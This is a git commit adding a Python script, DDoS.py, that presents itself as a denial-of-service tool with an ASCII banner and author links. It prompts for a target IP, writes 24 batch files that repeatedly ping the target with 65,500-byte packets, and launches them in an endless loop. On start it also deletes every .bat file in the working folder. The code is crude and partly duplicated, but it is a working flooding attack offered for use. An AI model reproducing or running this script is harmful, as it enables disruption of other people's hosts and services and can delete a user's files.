aba49f5c766af347701dcd3ff79883fb76714d26
Gteditor99 <nzen2@protonmail.com>
2021-09-02 16:56:51 +0900

    Update

---
+++ DDoS.py
@@ -0,0 +1,360 @@
+#DDoS.py
+
+#Imports:
+import os
+import sys
+
+import subprocess
+
+from platform import platform
+
+from os import listdir
+
+import socket 
+
+
+
+
+#Cache removing + SP flag for main screen
+  
+
+for bots in listdir():
+        
+    if bots.endswith('.bat'):    
+    
+        os.remove(bots)
+        clearcache = True
+    else: 
+        clearcache = False    
+
+
+
+
+
+version = 'v Alpha 0.1'
+
+# Change version in var 
+
+title = '''
+
+A DDoS/ DoS script written in Python, the upgraded version of the Batch version.
+
+srforek
+
+ __  _ ___ ___ __  _ ___        __  __   __    __  
+|  \| |_  | __|  \| (_  |  __  | _\| _\ /__\ /' _/ 
+| | ' |/ /| _|| | ' |/ /  |__| | v | v | \/ |`._`. 
+|_|\__|___|___|_|\__|___|      |__/|__/ \__/ |___/ 
+
+
+'''+version+'''
+
+:DDoS python script:
+
+By editor99
+
+
+Github repo: https://github.com/Gteditor99/DDOS-Nzen2
+
+Youtube: https://www.youtube.com/channel/UCrxNyJTsVtg5pSq3AYbhiAw
+
+Discord: editor99#6207
+
+
+
+        '''  
+
+
+logoascii = '''
+
+ __  _ ___ ___ __  _ ___        __  __   __    __  
+|  \| |_  | __|  \| (_  |  __  | _\| _\ /__\ /' _/ 
+| | ' |/ /| _|| | ' |/ /  |__| | v | v | \/ |`._`. 
+|_|\__|___|___|_|\__|___|      |__/|__/ \__/ |___/ 
+
+
+
+             '''
+
+if clearcache is True:  
+    
+
+    print(logoascii)
+
+    print("Cache has been deleted. (24/24) Reload Nzen2-DDoS.")
+
+    os.system('pause')
+
+    exit()
+
+
+    print(title)
+
+
+
+
+
+# Function for Main Screen, (mainscr) for easy access.
+
+def mainscr():  
+
+    os.system("cls")
+    print(title)
+
+    os.system("pause")
+
+mainscr()
+
+
+
+os.system("cls")
+
+
+sc2 = '''
+
+
+    Enter the destination IP Address:
+
+
+      (Localhost is the Local IP)
+
+    
+
+       '''
+
+
+
+
+#Optimazation is not an option :o
+
+def init():
+
+        os.system('echo :loop > bot1.bat')
+
+        os.system('echo :loop > bot2.bat')
+
+        os.system('echo :loop > bot3.bat')
+
+        os.system('echo :loop > bot4.bat')
+
+        os.system('echo :loop > bot5.bat')
+
+        os.system('echo :loop > bot6.bat')
+
+        os.system('echo :loop > bot7.bat')
+
+        os.system('echo :loop > bot8.bat')
+
+        os.system('echo :loop > bot9.bat')
+
+        os.system('echo :loop > bot10.bat')
+
+        os.system('echo :loop > bot11.bat')
+
+        os.system('echo :loop > bot12.bat')
+
+        os.system('echo :loop > bot13.bat')
+
+        os.system('echo :loop > bot14.bat')
+
+        os.system('echo :loop > bot15.bat')
+
+        os.system('echo :loop > bot16.bat')
+
+        os.system('echo :loop > bot17.bat')
+
+        os.system('echo :loop > bot18.bat')
+
+        os.system('echo :loop > bot19.bat')
+
+        os.system('echo :loop > bot20.bat')
+
+        os.system('echo :loop > bot21.bat')
+
+        os.system('echo :loop > bot22.bat')
+
+        os.system('echo :loop > bot23.bat')
+
+        os.system('echo :loop > bot24.bat')
+
+        os.system('echo ping '+ipadress+' -l 65500 -w 1 -n 1 >> bot1.bat')
+
+        os.system('echo ping '+ipadress+' -l 65500 -w 1 -n 1 >> bot2.bat')
+
+        os.system('echo ping '+ipadress+' -l 65500 -w 1 -n 1 >> bot3.bat')
+
+        os.system('echo ping '+ipadress+' -l 65500 -w 1 -n 1 >> bot4.bat')
+
+        os.system('echo ping '+ipadress+' -l 65500 -w 1 -n 1 >> bot5.bat')
+
+        os.system('echo ping '+ipadress+' -l 65500 -w 1 -n 1 >> bot6.bat')
+
+        os.system('echo ping '+ipadress+' -l 65500 -w 1 -n 1 >> bot7.bat')
+
+        os.system('echo ping '+ipadress+' -l 65500 -w 1 -n 1 >> bot8.bat')
+
+        os.system('echo ping '+ipadress+' -l 65500 -w 1 -n 1 >> bot9.bat')
+
+        os.system('echo ping '+ipadress+' -l 65500 -w 1 -n 1 >> bot10.bat')
+
+        os.system('echo ping '+ipadress+' -l 65500 -w 1 -n 1 >> bot11.bat')
+
+        os.system('echo ping '+ipadress+' -l 65500 -w 1 -n 1 >> bot12.bat')
+
+        os.system('echo ping '+ipadress+' -l 65500 -w 1 -n 1 >> bot13.bat')
+
+        os.system('echo ping '+ipadress+' -l 65500 -w 1 -n 1 >> bot14.bat')
+
+        os.system('echo ping '+ipadress+' -l 65500 -w 1 -n 1 >> bot15.bat')
+
+        os.system('echo ping '+ipadress+' -l 65500 -w 1 -n 1 >> bot16.bat')
+
+        os.system('echo ping '+ipadress+' -l 65500 -w 1 -n 1 >> bot17.bat')
+
+        os.system('echo ping '+ipadress+' -l 65500 -w 1 -n 1 >> bot18.bat')
+
+        os.system('echo ping '+ipadress+' -l 65500 -w 1 -n 1 >> bot19.bat')
+
+        os.system('echo ping '+ipadress+' -l 65500 -w 1 -n 1 >> bot20.bat')
+
+        os.system('echo ping '+ipadress+' -l 65500 -w 1 -n 1 >> bot21.bat')
+
+        os.system('echo ping '+ipadress+' -l 65500 -w 1 -n 1 >> bot22.bat')
+
+        os.system('echo ping '+ipadress+' -l 65500 -w 1 -n 1 >> bot23.bat')
+
+        os.system('echo ping '+ipadress+' -l 65500 -w 1 -n 1 >> bot24.bat')
+
+        os.system('echo goto loop >> bot1.bat')
+
+        os.system('echo goto loop >> bot2.bat')
+
+        os.system('echo goto loop >> bot3.bat')
+
+        os.system('echo goto loop >> bot4.bat')
+
+        os.system('echo goto loop >> bot5.bat')
+
+        os.system('echo goto loop >> bot6.bat')
+
+        os.system('echo goto loop >> bot7.bat')
+
+        os.system('echo goto loop >> bot8.bat')
+
+        os.system('echo goto loop >> bot9.bat')
+
+        os.system('echo goto loop >> bot10.bat')
+
+        os.system('echo goto loop >> bot11.bat')
+
+        os.system('echo goto loop >> bot12.bat')
+
+        os.system('echo goto loop >> bot11.bat')
+
+        os.system('echo goto loop >> bot12.bat')
+
+        os.system('echo goto loop >> bot13.bat')
+
+        os.system('echo goto loop >> bot14.bat')
+
+        os.system('echo goto loop >> bot15.bat')
+
+        os.system('echo goto loop >> bot16.bat')
+
+        os.system('echo goto loop >> bot17.bat')
+
+        os.system('echo goto loop >> bot18.bat')
+
+        os.system('echo goto loop >> bot19.bat')
+
+        os.system('echo goto loop >> bot20.bat')
+
+        os.system('echo goto loop >> bot21.bat')
+
+        os.system('echo goto loop >> bot22.bat')
+
+        os.system('echo goto loop >> bot23.bat')
+
+        os.system('echo goto loop >> bot24.bat')
+
+
+#Use botN.bat
+def launch():
+
+    while True:     
+
+        
+
+        subprocess.run('bot1.bat') 
+
+        subprocess.run('bot2.bat')
+
+        subprocess.run('bot3.bat')
+
+        subprocess.run('bot4.bat')
+
+        subprocess.run('bot5.bat')
+
+        subprocess.run('bot6.bat')
+
+        subprocess.run('bot7.bat')
+
+        subprocess.run('bot8.bat')
+
+        subprocess.run('bot9.bat')
+
+        subprocess.run('bot10.bat')
+
+        subprocess.run('bot11.bat')
+
+        subprocess.run('bot12.bat')
+
+        subprocess.run('bot13.bat')
+
+        subprocess.run('bot14.bat')
+
+        subprocess.run('bot15.bat')
+
+        subprocess.run('bot16.bat')
+
+        subprocess.run('bot17.bat')
+
+        subprocess.run('bot18.bat')
+
+        subprocess.run('bot19.bat')
+
+        subprocess.run('bot20.bat')
+
+        subprocess.run('bot21.bat')
+
+        subprocess.run('bot22.bat')
+
+        subprocess.run('bot23.bat')
+
+        subprocess.run('bot24.bat')
+       
+
+# Function for Second Screen, (secondscr) for easy access.
+
+def secondscr():
+    os.system('cls') 
+
+    print(sc2)
+
+    print(logoascii)
+    
+
+print(secondscr())
+
+
+ipadress = input("IP:")
+
+os.system('pause')
+init()
+
+launch()
+
+
+input("Press Enter to exit:")
+
+# Yo buddy, still alive?
